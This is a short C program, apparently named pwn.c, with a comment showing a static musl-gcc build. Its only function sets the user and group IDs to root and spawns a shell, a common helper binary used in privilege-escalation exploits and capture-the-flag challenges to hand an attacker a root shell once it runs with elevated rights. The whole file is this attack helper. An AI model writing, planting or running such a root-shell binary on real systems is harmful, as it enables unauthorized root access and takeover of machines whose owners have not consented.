// compile: musl-gcc -static pwn.c -o pwn
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(){
	setuid(0);
	setgid(0);
	system("sh");
}
